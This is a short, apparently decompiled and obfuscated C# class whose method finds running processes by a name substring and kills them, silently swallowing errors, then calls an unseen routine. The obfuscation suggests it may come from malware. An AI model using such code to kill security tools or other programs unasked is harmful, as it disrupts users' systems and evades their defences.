using System;
using System.Diagnostics;

namespace sWduCclqEzKrM;

public sealed class tuqmMWnauzQlgi
{
	public static bool RldbiCMIfiefQ(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void dEIwywOGjlqLg(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (RldbiCMIfiefQ(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					wJkbnIWOteHAMM.NfybKqnWcJrqY();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
